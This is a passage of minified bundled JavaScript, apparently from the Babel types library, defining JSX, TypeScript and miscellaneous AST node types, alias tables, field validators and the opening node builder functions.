agment",{builder:["openingFragment","closingFragment","children"],visitor:["openingFragment","children","closingFragment"],aliases:["Immutable","Expression"],fields:{openingFragment:{validate:(0,j0.assertNodeType)("JSXOpeningFragment")},closingFragment:{validate:(0,j0.assertNodeType)("JSXClosingFragment")},children:(0,j0.validateArrayOfType)("JSXText","JSXExpressionContainer","JSXSpreadChild","JSXElement","JSXFragment")}});s0("JSXOpeningFragment",{aliases:["Immutable"]});s0("JSXClosingFragment",{aliases:["Immutable"]})});var UY=v((kK)=>{Object.defineProperty(kK,"__esModule",{value:!0});kK.PLACEHOLDERS_FLIPPED_ALIAS=kK.PLACEHOLDERS_ALIAS=kK.PLACEHOLDERS=void 0;var Ol=z6(),Fl=kK.PLACEHOLDERS=["Identifier","StringLiteral","Expression","Statement","Declaration","BlockStatement","ClassBody","Pattern"],KY=kK.PLACEHOLDERS_ALIAS={Declaration:["Statement"],Pattern:["PatternLike","LVal"]};for(let X of Fl){let J=Ol.ALIAS_KEYS[X];if(J!=null&&J.length)KY[X]=J}var VY=kK.PLACEHOLDERS_FLIPPED_ALIAS={};Object.keys(KY).forEach((X)=>{KY[X].forEach((J)=>{if(!hasOwnProperty.call(VY,J))VY[J]=[];VY[J].push(X)})})});var vK=v(()=>{var s5=z6(),Dl=UY(),wl=X7(),ZY=(0,s5.defineAliasedType)("Miscellaneous");ZY("Noop",{visitor:[]});ZY("Placeholder",{visitor:[],builder:["expectedNode","name"],fields:Object.assign({name:{validate:(0,s5.assertNodeType)("Identifier")},expectedNode:{validate:(0,s5.assertOneOf)(...Dl.PLACEHOLDERS)}},(0,wl.patternLikeCommon)())});ZY("V8IntrinsicIdentifier",{builder:["name"],fields:{name:{validate:(0,s5.assertValueType)("string")}}})});var fK=v(()=>{var V0=z6();(0,V0.default)("ArgumentPlaceholder",{});(0,V0.default)("BindExpression",{visitor:["object","callee"],aliases:["Expression"],fields:!process.env.BABEL_TYPES_8_BREAKING?{object:{validate:Object.assign(()=>{},{oneOfNodeTypes:["Expression"]})},callee:{validate:Object.assign(()=>{},{oneOfNodeTypes:["Expression"]})}}:{object:{validate:(0,V0.assertNodeType)("Expression")},callee:{validate:(0,V0.assertNodeType)("Expression")}}});(0,V0.default)("Decorator",{visitor:["expression"],fields:{expression:{validate:(0,V0.assertNodeType)("Expression")}}});(0,V0.default)("DoExpression",{visitor:["body"],builder:["body","async"],aliases:["Expression"],fields:{body:{validate:(0,V0.assertNodeType)("BlockStatement")},async:{validate:(0,V0.assertValueType)("boolean"),default:!1}}});(0,V0.default)("ExportDefaultSpecifier",{visitor:["exported"],aliases:["ModuleSpecifier"],fields:{exported:{validate:(0,V0.assertNodeType)("Identifier")}}});(0,V0.default)("RecordExpression",{visitor:["properties"],aliases:["Expression"],fields:{properties:(0,V0.validateArrayOfType)("ObjectProperty","SpreadElement")}});(0,V0.default)("TupleExpression",{fields:{elements:{validate:(0,V0.arrayOfType)("Expression","SpreadElement"),default:[]}},visitor:["elements"],aliases:["Expression"]});(0,V0.default)("DecimalLiteral",{builder:["value"],fields:{value:{validate:(0,V0.assertValueType)("string")}},aliases:["Expression","Pureish","Literal","Immutable"]});(0,V0.default)("ModuleExpression",{visitor:["body"],fields:{body:{validate:(0,V0.assertNodeType)("Program")}},aliases:["Expression"]});(0,V0.default)("TopicReference",{aliases:["Expression"]});(0,V0.default)("PipelineTopicExpression",{builder:["expression"],visitor:["expression"],fields:{expression:{validate:(0,V0.assertNodeType)("Expression")}},aliases:["Expression"]});(0,V0.default)("PipelineBareFunction",{builder:["callee"],visitor:["callee"],fields:{callee:{validate:(0,V0.assertNodeType)("Expression")}},aliases:["Expression"]});(0,V0.default)("PipelinePrimaryTopicReference",{aliases:["Expression"]});(0,V0.default)("VoidPattern",{aliases:["Pattern","PatternLike","FunctionParameter"]})});var lK=v(()=>{var u=z6(),xK=X7(),Nl=u8(),D1=(0,u.defineAliasedType)("TypeScript"),$9=(0,u.assertValueType)("boolean"),hK=()=>({returnType:{validate:(0,u.assertNodeType)("TSTypeAnnotation","Noop"),optional:!0},typeParameters:{validate:(0,u.assertNodeType)("TSTypeParameterDeclaration","Noop"),optional:!0}});D1("TSParameterProperty",{aliases:["LVal"],visitor:["parameter"],fields:{accessibility:{validate:(0,u.assertOneOf)("public","private","protected"),optional:!0},readonly:{validate:(0,u.assertValueType)("boolean"),optional:!0},parameter:{validate:(0,u.assertNodeType)("Identifier","AssignmentPattern")},override:{validate:(0,u.assertValueType)("boolean"),optional:!0},decorators:{validate:(0,u.arrayOfType)("Decorator"),optional:!0}}});D1("TSDeclareFunction",{aliases:["Statement","Declaration"],visitor:["id","typeParameters","params","returnType"],fields:Object.assign({},(0,xK.functionDeclarationCommon)(),hK())});D1("TSDeclareMethod",{visitor:["decorators","key","typeParameters","params","returnType"],fields:Object.assign({},(0,xK.classMethodOrDeclareMethodCommon)(),hK())});D1("TSQualifiedName",{aliases:["TSEntityName"],visitor:["left","right"],fields:{left:(0,u.validateType)("TSEntityName"),right:(0,u.validateType)("Identifier")}});var o5=()=>({typeParameters:(0,u.validateOptionalType)("TSTypeParameterDeclaration"),["parameters"]:(0,u.validateArrayOfType)("ArrayPattern","Identifier","ObjectPattern","RestElement"),["typeAnnotation"]:(0,u.validateOptionalType)("TSTypeAnnotation")}),yK={aliases:["TSTypeElement"],visitor:["typeParameters","parameters","typeAnnotation"],fields:o5()};D1("TSCallSignatureDeclaration",yK);D1("TSConstructSignatureDeclaration",yK);var gK=()=>({key:(0,u.validateType)("Expression"),computed:{default:!1},optional:(0,u.validateOptional)($9)});D1("TSPropertySignature",{aliases:["TSTypeElement"],visitor:["key","typeAnnotation"],fields:Object.assign({},gK(),{readonly:(0,u.validateOptional)($9),typeAnnotation:(0,u.validateOptionalType)("TSTypeAnnotation"),kind:{optional:!0,validate:(0,u.assertOneOf)("get","set")}})});D1("TSMethodSignature",{aliases:["TSTypeElement"],visitor:["key","typeParameters","parameters","typeAnnotation"],fields:Object.assign({},o5(),gK(),{kind:{validate:(0,u.assertOneOf)("method","get","set")}})});D1("TSIndexSignature",{aliases:["TSTypeElement"],visitor:["parameters","typeAnnotation"],fields:{readonly:(0,u.validateOptional)($9),static:(0,u.validateOptional)($9),parameters:(0,u.validateArrayOfType)("Identifier"),typeAnnotation:(0,u.validateOptionalType)("TSTypeAnnotation")}});var Ll=["TSAnyKeyword","TSBooleanKeyword","TSBigIntKeyword","TSIntrinsicKeyword","TSNeverKeyword","TSNullKeyword","TSNumberKeyword","TSObjectKeyword","TSStringKeyword","TSSymbolKeyword","TSUndefinedKeyword","TSUnknownKeyword","TSVoidKeyword"];for(let X of Ll)D1(X,{aliases:["TSType","TSBaseType"],visitor:[],fields:{}});D1("TSThisType",{aliases:["TSType","TSBaseType"],visitor:[],fields:{}});var mK={aliases:["TSType"],visitor:["typeParameters","parameters","typeAnnotation"]};D1("TSFunctionType",Object.assign({},mK,{fields:o5()}));D1("TSConstructorType",Object.assign({},mK,{fields:Object.assign({},o5(),{abstract:(0,u.validateOptional)($9)})}));D1("TSTypeReference",{aliases:["TSType"],visitor:["typeName","typeParameters"],fields:{typeName:(0,u.validateType)("TSEntityName"),["typeParameters"]:(0,u.validateOptionalType)("TSTypeParameterInstantiation")}});D1("TSTypePredicate",{aliases:["TSType"],visitor:["parameterName","typeAnnotation"],builder:["parameterName","typeAnnotation","asserts"],fields:{parameterName:(0,u.validateType)("Identifier","TSThisType"),typeAnnotation:(0,u.validateOptionalType)("TSTypeAnnotation"),asserts:(0,u.validateOptional)($9)}});D1("TSTypeQuery",{aliases:["TSType"],visitor:["exprName","typeParameters"],fields:{exprName:(0,u.validateType)("TSEntityName","TSImportType"),["typeParameters"]:(0,u.validateOptionalType)("TSTypeParameterInstantiation")}});D1("TSTypeLiteral",{aliases:["TSType"],visitor:["members"],fields:{members:(0,u.validateArrayOfType)("TSTypeElement")}});D1("TSArrayType",{aliases:["TSType"],visitor:["elementType"],fields:{elementType:(0,u.validateType)("TSType")}});D1("TSTupleType",{aliases:["TSType"],visitor:["elementTypes"],fields:{elementTypes:(0,u.validateArrayOfType)("TSType","TSNamedTupleMember")}});D1("TSOptionalType",{aliases:["TSType"],visitor:["typeAnnotation"],fields:{typeAnnotation:(0,u.validateType)("TSType")}});D1("TSRestType",{aliases:["TSType"],visitor:["typeAnnotation"],fields:{typeAnnotation:(0,u.validateType)("TSType")}});D1("TSNamedTupleMember",{visitor:["label","elementType"],builder:["label","elementType","optional"],fields:{label:(0,u.validateType)("Identifier"),optional:{validate:$9,default:!1},elementType:(0,u.validateType)("TSType")}});var uK={aliases:["TSType"],visitor:["types"],fields:{types:(0,u.validateArrayOfType)("TSType")}};D1("TSUnionType",uK);D1("TSIntersectionType",uK);D1("TSConditionalType",{aliases:["TSType"],visitor:["checkType","extendsType","trueType","falseType"],fields:{checkType:(0,u.validateType)("TSType"),extendsType:(0,u.validateType)("TSType"),trueType:(0,u.validateType)("TSType"),falseType:(0,u.validateType)("TSType")}});D1("TSInferType",{aliases:["TSType"],visitor:["typeParameter"],fields:{typeParameter:(0,u.validateType)("TSTypeParameter")}});D1("TSParenthesizedType",{aliases:["TSType"],visitor:["typeAnnotation"],fields:{typeAnnotation:(0,u.validateType)("TSType")}});D1("TSTypeOperator",{aliases:["TSType"],visitor:["typeAnnotation"],builder:["typeAnnotation","operator"],fields:{operator:{validate:(0,u.assertValueType)("string"),default:"keyof"},typeAnnotation:(0,u.validateType)("TSType")}});D1("TSIndexedAccessType",{aliases:["TSType"],visitor:["objectType","indexType"],fields:{objectType:(0,u.validateType)("TSType"),indexType:(0,u.validateType)("TSType")}});D1("TSMappedType",{aliases:["TSType"],visitor:["typeParameter","nameType","typeAnnotation"],builder:["typeParameter","typeAnnotation","nameType"],fields:Object.assign({},{typeParameter:(0,u.validateType)("TSTypeParameter")},{readonly:(0,u.validateOptional)((0,u.assertOneOf)(!0,!1,"+","-")),optional:(0,u.validateOptional)((0,u.assertOneOf)(!0,!1,"+","-")),typeAnnotation:(0,u.validateOptionalType)("TSType"),nameType:(0,u.validateOptionalType)("TSType")})});D1("TSTemplateLiteralType",{aliases:["TSType","TSBaseType"],visitor:["quasis","types"],fields:{quasis:(0,u.validateArrayOfType)("TemplateElement"),types:{validate:(0,u.chain)((0,u.assertValueType)("array"),(0,u.assertEach)((0,u.assertNodeType)("TSType")),function(X,J,Q){if(X.quasis.length!==Q.length+1)throw TypeError(`Number of ${X.type} quasis should be exactly one more than the number of types.
Expected ${Q.length+1} quasis but got ${X.quasis.length}`)})}}});D1("TSLiteralType",{aliases:["TSType","TSBaseType"],visitor:["literal"],fields:{literal:{validate:function(){let X=(0,u.assertNodeType)("NumericLiteral","BigIntLiteral"),J=(0,u.assertOneOf)("-"),Q=(0,u.assertNodeType)("NumericLiteral","StringLiteral","BooleanLiteral","BigIntLiteral","TemplateLiteral");function Y(W,G,H){if((0,Nl.default)("UnaryExpression",H))J(H,"operator",H.operator),X(H,"argument",H.argument);else Q(W,G,H)}return Y.oneOfNodeTypes=["NumericLiteral","StringLiteral","BooleanLiteral","BigIntLiteral","TemplateLiteral","UnaryExpression"],Y}()}}});D1("TSExpressionWithTypeArguments",{aliases:["TSType"],visitor:["expression","typeParameters"],fields:{expression:(0,u.validateType)("TSEntityName"),typeParameters:(0,u.validateOptionalType)("TSTypeParameterInstantiation")}});D1("TSInterfaceDeclaration",{aliases:["Statement","Declaration"],visitor:["id","typeParameters","extends","body"],fields:{declare:(0,u.validateOptional)($9),id:(0,u.validateType)("Identifier"),typeParameters:(0,u.validateOptionalType)("TSTypeParameterDeclaration"),extends:(0,u.validateOptional)((0,u.arrayOfType)("TSExpressionWithTypeArguments")),body:(0,u.validateType)("TSInterfaceBody")}});D1("TSInterfaceBody",{visitor:["body"],fields:{body:(0,u.validateArrayOfType)("TSTypeElement")}});D1("TSTypeAliasDeclaration",{aliases:["Statement","Declaration"],visitor:["id","typeParameters","typeAnnotation"],fields:{declare:(0,u.validateOptional)($9),id:(0,u.validateType)("Identifier"),typeParameters:(0,u.validateOptionalType)("TSTypeParameterDeclaration"),typeAnnotation:(0,u.validateType)("TSType")}});D1("TSInstantiationExpression",{aliases:["Expression"],visitor:["expression","typeParameters"],fields:{expression:(0,u.validateType)("Expression"),["typeParameters"]:(0,u.validateOptionalType)("TSTypeParameterInstantiation")}});var cK={aliases:["Expression","LVal","PatternLike"],visitor:["expression","typeAnnotation"],fields:{expression:(0,u.validateType)("Expression"),typeAnnotation:(0,u.validateType)("TSType")}};D1("TSAsExpression",cK);D1("TSSatisfiesExpression",cK);D1("TSTypeAssertion",{aliases:["Expression","LVal","PatternLike"],visitor:["typeAnnotation","expression"],fields:{typeAnnotation:(0,u.validateType)("TSType"),expression:(0,u.validateType)("Expression")}});D1("TSEnumBody",{visitor:["members"],fields:{members:(0,u.validateArrayOfType)("TSEnumMember")}});D1("TSEnumDeclaration",{aliases:["Statement","Declaration"],visitor:["id","members"],fields:{declare:(0,u.validateOptional)($9),const:(0,u.validateOptional)($9),id:(0,u.validateType)("Identifier"),members:(0,u.validateArrayOfType)("TSEnumMember"),initializer:(0,u.validateOptionalType)("Expression"),body:(0,u.validateOptionalType)("TSEnumBody")}});D1("TSEnumMember",{visitor:["id","initializer"],fields:{id:(0,u.validateType)("Identifier","StringLiteral"),initializer:(0,u.validateOptionalType)("Expression")}});D1("TSModuleDeclaration",{aliases:["Statement","Declaration"],visitor:["id","body"],fields:Object.assign({kind:{validate:(0,u.assertOneOf)("global","module","namespace")},declare:(0,u.validateOptional)($9)},{global:(0,u.validateOptional)($9)},{id:(0,u.validateType)("Identifier","StringLiteral"),body:(0,u.validateType)("TSModuleBlock","TSModuleDeclaration")})});D1("TSModuleBlock",{aliases:["Scopable","Block","BlockParent","FunctionParent"],visitor:["body"],fields:{body:(0,u.validateArrayOfType)("Statement")}});D1("TSImportType",{aliases:["TSType"],builder:["argument","qualifier","typeParameters"],visitor:["argument","options","qualifier","typeParameters"],fields:{argument:(0,u.validateType)("StringLiteral"),qualifier:(0,u.validateOptionalType)("TSEntityName"),["typeParameters"]:(0,u.validateOptionalType)("TSTypeParameterInstantiation"),options:{validate:(0,u.assertNodeType)("ObjectExpression"),optional:!0}}});D1("TSImportEqualsDeclaration",{aliases:["Statement","Declaration"],visitor:["id","moduleReference"],fields:Object.assign({},{isExport:(0,u.validate)($9)},{id:(0,u.validateType)("Identifier"),moduleReference:(0,u.validateType)("TSEntityName","TSExternalModuleReference"),importKind:{validate:(0,u.assertOneOf)("type","value"),optional:!0}})});D1("TSExternalModuleReference",{visitor:["expression"],fields:{expression:(0,u.validateType)("StringLiteral")}});D1("TSNonNullExpression",{aliases:["Expression","LVal","PatternLike"],visitor:["expression"],fields:{expression:(0,u.validateType)("Expression")}});D1("TSExportAssignment",{aliases:["Statement"],visitor:["expression"],fields:{expression:(0,u.validateType)("Expression")}});D1("TSNamespaceExportDeclaration",{aliases:["Statement"],visitor:["id"],fields:{id:(0,u.validateType)("Identifier")}});D1("TSTypeAnnotation",{visitor:["typeAnnotation"],fields:{typeAnnotation:{validate:(0,u.assertNodeType)("TSType")}}});D1("TSTypeParameterInstantiation",{visitor:["params"],fields:{params:(0,u.validateArrayOfType)("TSType")}});D1("TSTypeParameterDeclaration",{visitor:["params"],fields:{params:(0,u.validateArrayOfType)("TSTypeParameter")}});D1("TSTypeParameter",{builder:["constraint","default","name"],visitor:["constraint","default"],fields:{name:{validate:(0,u.assertValueType)("string")},in:{validate:(0,u.assertValueType)("boolean"),optional:!0},out:{validate:(0,u.assertValueType)("boolean"),optional:!0},const:{validate:(0,u.assertValueType)("boolean"),optional:!0},constraint:{validate:(0,u.assertNodeType)("TSType"),optional:!0},default:{validate:(0,u.assertNodeType)("TSType"),optional:!0}}})});var iK=v((pK)=>{Object.defineProperty(pK,"__esModule",{value:!0});pK.DEPRECATED_ALIASES=void 0;var nm1=pK.DEPRECATED_ALIASES={ModuleDeclaration:"ImportOrExportDeclaration"}});var I9=v((j9)=>{Object.defineProperty(j9,"__esModule",{value:!0});Object.defineProperty(j9,"ALIAS_KEYS",{enumerable:!0,get:function(){return V9.ALIAS_KEYS}});Object.defineProperty(j9,"BUILDER_KEYS",{enumerable:!0,get:function(){return V9.BUILDER_KEYS}});Object.defineProperty(j9,"DEPRECATED_ALIASES",{enumerable:!0,get:function(){return qY.DEPRECATED_ALIASES}});Object.defineProperty(j9,"DEPRECATED_KEYS",{enumerable:!0,get:function(){return V9.DEPRECATED_KEYS}});Object.defineProperty(j9,"FLIPPED_ALIAS_KEYS",{enumerable:!0,get:function(){return V9.FLIPPED_ALIAS_KEYS}});Object.defineProperty(j9,"NODE_FIELDS",{enumerable:!0,get:function(){return V9.NODE_FIELDS}});Object.defineProperty(j9,"NODE_PARENT_VALIDATIONS",{enumerable:!0,get:function(){return V9.NODE_PARENT_VALIDATIONS}});Object.defineProperty(j9,"PLACEHOLDERS",{enumerable:!0,get:function(){return BY.PLACEHOLDERS}});Object.defineProperty(j9,"PLACEHOLDERS_ALIAS",{enumerable:!0,get:function(){return BY.PLACEHOLDERS_ALIAS}});Object.defineProperty(j9,"PLACEHOLDERS_FLIPPED_ALIAS",{enumerable:!0,get:function(){return BY.PLACEHOLDERS_FLIPPED_ALIAS}});j9.TYPES=void 0;Object.defineProperty(j9,"VISITOR_KEYS",{enumerable:!0,get:function(){return V9.VISITOR_KEYS}});X7();_K();EK();vK();fK();lK();var V9=z6(),BY=UY(),qY=iK();Object.keys(qY.DEPRECATED_ALIASES).forEach((X)=>{V9.FLIPPED_ALIAS_KEYS[X]=V9.FLIPPED_ALIAS_KEYS[qY.DEPRECATED_ALIASES[X]]});for(let{types:X,set:J}of V9.allExpandedTypes)for(let Q of X){let Y=V9.FLIPPED_ALIAS_KEYS[Q];if(Y)Y.forEach(J.add,J);else J.add(Q)}var om1=j9.TYPES=[].concat(Object.keys(V9.VISITOR_KEYS),Object.keys(V9.FLIPPED_ALIAS_KEYS),Object.keys(V9.DEPRECATED_KEYS))});var a5=v((sK)=>{Object.defineProperty(sK,"__esModule",{value:!0});sK.default=Il;sK.validateChild=nK;sK.validateField=aK;sK.validateInternal=Cl;var J7=I9();function Il(X,J,Q){if(!X)return;let Y=J7.NODE_FIELDS[X.type];if(!Y)return;let W=Y[J];aK(X,J,Q,W),nK(X,J,Q)}function Cl(X,J,Q,Y,W){if(!(X!=null&&X.validate))return;if(X.optional&&Y==null)return;if(X.validate(J,Q,Y),W){var G;let H=Y.type;if(H==null)return;(G=J7.NODE_PARENT_VALIDATIONS[H])==null||G.call(J7.NODE_PARENT_VALIDATIONS,J,Q,Y)}}function aK(X,J,Q,Y){if(!(Y!=null&&Y.validate))return;if(Y.optional&&Q==null)return;Y.validate(X,J,Q)}function nK(X,J,Q){var Y;let W=Q==null?void 0:Q.type;if(W==null)return;(Y=J7.NODE_PARENT_VALIDATIONS[W])==null||Y.call(J7.NODE_PARENT_VALIDATIONS,X,J,Q)}});var MY=v((JU)=>{Object.defineProperty(JU,"__esModule",{value:!0});JU.anyTypeAnnotation=Kd;JU.argumentPlaceholder=gi;JU.arrayExpression=vl;JU.arrayPattern=Tp;JU.arrayTypeAnnotation=Ud;JU.arrowFunctionExpression=_p;JU.assignmentExpression=fl;JU.assignmentPattern=Sp;JU.awaitExpression=tp;JU.bigIntLiteral=bl;JU.binaryExpression=xl;JU.bindExpression=mi;JU.blockStatement=ml;JU.booleanLiteral=Hp;JU.booleanLiteralTypeAnnotation=qd;JU.booleanTypeAnnotation=Zd;JU.breakStatement=ul;JU.callExpression=cl;JU.catchClause=ll;JU.classAccessorProperty=Wd;JU.classBody=Ep;JU.classDeclaration=bp;JU.classExpression=kp;JU.classImplements=Md;JU.classMethod=dp;JU.classPrivateMethod=Hd;JU.classPrivateProperty=Gd;JU.classProperty=Yd;JU.conditionalExpression=pl;JU.continueStatement=dl;JU.debuggerStatement=il;JU.decimalLiteral=ii;JU.declareClass=jd;JU.declareExportAllDeclaration=Id;JU.declareExportDeclaration=Ld;JU.declareFunction=Od;JU.declareInterface=Fd;JU.declareModule=Rd;JU.declareModuleExports=Ad;JU.declareOpaqueType=wd;JU.declareTypeAlias=Dd;JU.declareVariable=Nd;JU.declaredPredicate=Cd;JU.decorator=ui;JU.directive=yl;JU.directiveLiteral=gl;JU.doExpression=ci;JU.doWhileStatement=rl;JU.emptyStatement=al;JU.emptyTypeAnnotation=hd;JU.enumBooleanBody=Ui;JU.enumBooleanMember=Mi;JU.enumDeclaration=Ki;JU.enumDefaultedMember=Fi;JU.enumNumberBody=Zi;JU.enumNumberMember=ji;JU.enumStringBody=qi;JU.enumStringMember=Oi;JU.enumSymbolBody=Bi;JU.existsTypeAnnotation=Pd;JU.exportAllDeclaration=vp;JU.exportDefaultDeclaration=fp;JU.exportDefaultSpecifier=li;JU.exportNamedDeclaration=xp;JU.exportNamespaceSpecifier=Xd;JU.exportSpecifier=hp;JU.expressionStatement=nl;JU.file=sl;JU.forInStatement=ol;JU.forOfStatement=yp;JU.forStatement=tl;JU.functionDeclaration=el;JU.functionExpression=Xp;JU.functionTypeAnnotation=Sd;JU.functionTypeParam=Td;JU.genericTypeAnnotation=_d;JU.identifier=Jp;JU.ifStatement=Qp;JU.import=ep;JU.importAttribute=Vd;JU.importDeclaration=gp;JU.importDefaultSpecifier=mp;JU.importExpression=lp;JU.importNamespaceSpecifier=up;JU.importSpecifier=cp;JU.indexedAccessType=Ri;JU.inferredPredicate=Ed;JU.interfaceDeclaration=bd;JU.interfaceExtends=kd;JU.interfaceTypeAnnotation=vd;JU.interpreterDirective=hl;JU.intersectionTypeAnnotation=fd;JU.jSXAttribute=JU.jsxAttribute=Di;JU.jSXClosingElement=JU.jsxClosingElement=wi;JU.jSXClosingFragment=JU.jsxClosingFragment=fi;JU.jSXElement=JU.jsxElement=Ni;JU.jSXEmptyExpression=JU.jsxEmptyExpression=Li;JU.jSXExpressionContainer=JU.jsxExpressionContainer=Ii;JU.jSXFragment=JU.jsxFragment=bi;JU.jSXIdentifier=JU.jsxIdentifier=Pi;JU.jSXMemberExpression=JU.jsxMemberExpression=Si;JU.jSXNamespacedName=JU.jsxNamespacedName=Ti;JU.jSXOpeningElement=JU.jsxOpeningElement=_i;JU.jSXOpeningFragment=JU.jsxOpeningFragment=vi;JU.jSXSpreadAttribute=JU.jsxSpreadAttribute=Ei;JU.jSXSpreadChild=JU.jsxSpreadChild=Ci;JU.jSXText=JU.jsxText=ki;JU.labeledStatement=Yp;JU.logicalExpression=zp;JU.memberExpression=$p;JU.metaProperty=pp;JU.mixedTypeAnnotation=xd;JU.moduleExpression=ri;JU.newExpression=Vp;JU.noop=xi;JU.nullLiteral=Gp;JU.nullLiteralTypeAnnotation=Bd;JU.nullableTypeAnnotation=yd;JU.numberLiteral=Za;JU.numberLiteralTypeAnnotation=gd;JU.numberTypeAnnotation=md;JU.numericLiteral=oK;JU.objectExpression=Up;JU.objectMethod=Zp;JU.objectPattern=ip;JU.objectProperty=qp;JU.objectTypeAnnotation=ud;JU.objectTypeCallProperty=ld;JU.objectTypeIndexer=pd;JU.objectTypeInternalSlot=cd;JU.objectTypeProperty=dd;JU.objectTypeSpreadProperty=id;JU.opaqueType=rd;JU.optionalCallExpression=Qd;JU.optionalIndexedAccessType=Ai;JU.optionalMemberExpression=Jd;JU.parenthesizedExpression=jp;JU.pipelineBareFunction=si;JU.pipelinePrimaryTopicReference=oi;JU.pipelineTopicExpression=ni;JU.placeholder=hi;JU.privateName=zd;JU.program=Kp;JU.qualifiedTypeIdentifier=ad;JU.recordExpression=pi;JU.regExpLiteral=tK;JU.regexLiteral=qa;JU.restElement=eK;JU.restProperty=Ba;JU.returnStatement=Bp;JU.sequenceExpression=Mp;JU.spreadElement=XU;JU.spreadProperty=Ma;JU.staticBlock=$d;JU.stringLiteral=Wp;JU.stringLiteralTypeAnnotation=nd;JU.stringTypeAnnotation=sd;JU.super=rp;JU.switchCase=Op;JU.switchStatement=Fp;JU.symbolTypeAnnotation=od;JU.taggedTemplateExpression=ap;JU.templateElement=np;JU.templateLiteral=sp;JU.thisExpression=Rp;JU.thisTypeAnnotation=td;JU.throwStatement=Ap;JU.topicReference=ai;JU.tryStatement=Dp;JU.tSAnyKeyword=JU.tsAnyKeyword=$r;JU.tSArrayType=JU.tsArrayType=Sr;JU.tSAsExpression=JU.tsAsExpression=ar;JU.tSBigIntKeyword=JU.tsBigIntKeyword=Kr;JU.tSBooleanKeyword=JU.tsBooleanKeyword=Vr;JU.tSCallSignatureDeclaration=JU.tsCallSignatureDeclaration=Yr;JU.tSConditionalType=JU.tsConditionalType=fr;JU.tSConstructSignatureDeclaration=JU.tsConstructSignatureDeclaration=Wr;JU.tSConstructorType=JU.tsConstructorType=Nr;JU.tSDeclareFunction=JU.tsDeclareFunction=Xr;JU.tSDeclareMethod=JU.tsDeclareMethod=Jr;JU.tSEnumBody=JU.tsEnumBody=or;JU.tSEnumDeclaration=JU.tsEnumDeclaration=tr;JU.tSEnumMember=JU.tsEnumMember=er;JU.tSExportAssignment=JU.tsExportAssignment=Ha;JU.tSExpressionWithTypeArguments=JU.tsExpressionWithTypeArguments=lr;JU.tSExternalModuleReference=JU.tsExternalModuleReference=Wa;JU.tSFunctionType=JU.tsFunctionType=wr;JU.tSImportEqualsDeclaration=JU.tsImportEqualsDeclaration=Ya;JU.tSImportType=JU.tsImportType=Qa;JU.tSIndexSignature=JU.tsIndexSignature=zr;JU.tSIndexedAccessType=JU.tsIndexedAccessType=gr;JU.tSInferType=JU.tsInferType=xr;JU.tSInstantiationExpression=JU.tsInstantiationExpression=rr;JU.tSInterfaceBody=JU.tsInterfaceBody=dr;JU.tSInterfaceDeclaration=JU.tsInterfaceDeclaration=pr;JU.tSIntersectionType=JU.tsIntersectionType=vr;JU.tSIntrinsicKeyword=JU.tsIntrinsicKeyword=Ur;JU.tSLiteralType=JU.tsLiteralType=cr;JU.tSMappedType=JU.tsMappedType=mr;JU.tSMethodSignature=JU.tsMethodSignature=Hr;JU.tSModuleBlock=JU.tsModuleBlock=Ja;JU.tSModuleDeclaration=JU.tsModuleDeclaration=Xa;JU.tSNamedTupleMember=JU.tsNamedTupleMember=kr;JU.tSNamespaceExportDeclaration=JU.tsNamespaceExportDeclaration=za;JU.tSNeverKeyword=JU.tsNeverKeyword=Zr;JU.tSNonNullExpression=JU.tsNonNullExpression=Ga;JU.tSNullKeyword=JU.tsNullKeyword=qr;JU.tSNumberKeyword=JU.tsNumberKeyword=Br;JU.tSObjectKeyword=JU.tsObjectKeyword=Mr;JU.tSOptionalType=JU.tsOptionalType=_r;JU.tSParameterProperty=JU.tsParameterProperty=ei;JU.tSParenthesizedType=JU.tsParenthesizedType=hr;JU.tSPropertySignature=JU.tsPropertySignature=Gr;JU.tSQualifiedName=JU.tsQualifiedName=Qr;JU.tSRestType=JU.tsRestType=Er;JU.tSSatisfiesExpression=JU.tsSatisfiesExpression=nr;JU.tSStringKeyword=JU.tsStringKeyword=jr;JU.tSSymbolKeyword=JU.tsSymbolKeyword=Or;JU.tSTemplateLiteralType=JU.tsTemplateLiteralType=ur;JU.tSThisType=JU.tsThisType=Dr;JU.tSTupleType=JU.tsTupleType=Tr;JU.tSTypeAliasDeclaration=JU.tsTypeAliasDeclaration=ir;JU.tSTypeAnnotation=JU.tsTypeAnnotation=$a;JU.tSTypeAssertion=JU.tsTypeAssertion=sr;JU.tSTypeLiteral=JU.tsTypeLiteral=Pr;JU.tSTypeOperator=JU.tsTypeOperator=yr;JU.tSTypeParameter=JU.tsTypeParameter=Ua;JU.tSTypeParameterDeclaration=JU.tsTypeParameterDeclaration=Ka;JU.tSTypeParameterInstantiation=JU.tsTypeParameterInstantiation=Va;JU.tSTypePredicate=JU.tsTypePredicate=Ir;JU.tSTypeQuery=JU.tsTypeQuery=Cr;JU.tSTypeReference=JU.tsTypeReference=Lr;JU.tSUndefinedKeyword=JU.tsUndefinedKeyword=Fr;JU.tSUnionType=JU.tsUnionType=br;JU.tSUnknownKeyword=JU.tsUnknownKeyword=Rr;JU.tSVoidKeyword=JU.tsVoidKeyword=Ar;JU.tupleExpression=di;JU.tupleTypeAnnotation=ed;JU.typeAlias=Ji;JU.typeAnnotation=Qi;JU.typeCastExpression=Yi;JU.typeParameter=Wi;JU.typeParameterDeclaration=Gi;JU.typeParameterInstantiation=Hi;JU.typeofTypeAnnotation=Xi;JU.unaryExpression=wp;JU.unionTypeAnnotation=zi;JU.updateExpression=Np;JU.v8IntrinsicIdentifier=yi;JU.variableDeclaration=Lp;JU.variableDeclarator=Ip;JU.variance=$i;JU.voidPattern=ti;JU.voidTypeAnnotation=Vi;JU.whileStatement=Cp;JU.withStatement=Pp;JU.yieldExpression=op;var El=a5(),t5=m8(),kl=z6(),{validateInternal:j}=El,{NODE_FIELDS:E}=kl;function bl(X){if(typeof X==="bigint")X=X.toString();let J={type:"BigIntLiteral",value:X},Q=E.BigIntLiteral;return j(Q.value,J,"value",X),J}function vl(X=[]){let J={type:"ArrayExpression",elements:X},Q=E.ArrayExpression;return j(Q.elements,J,"elements",X,1),J}function fl(X,J,Q){let Y={type:"AssignmentExpression",operator:X,left:J,right:Q},W=E.AssignmentExpression;return j(W.operator,Y,"operator",X),j(W.left,Y,"left",J,1),j(W.right,Y,"right",Q,1),Y}function xl(X,J,Q){let Y={type:"BinaryExpression",operator:X,left:J,right:Q},W=E.BinaryExpression;return j(W.operator,Y,"operator",X),j(W.left,Y,"left",J,1),j(W.right,Y,"right",Q,1),Y}function hl(X){let J={type:"InterpreterDirective",value:X},Q=E.InterpreterDirective;return j(Q.value,J,"value",X),J}function yl(X){let J={type:"Directive",value:X},Q=E.Directive;return 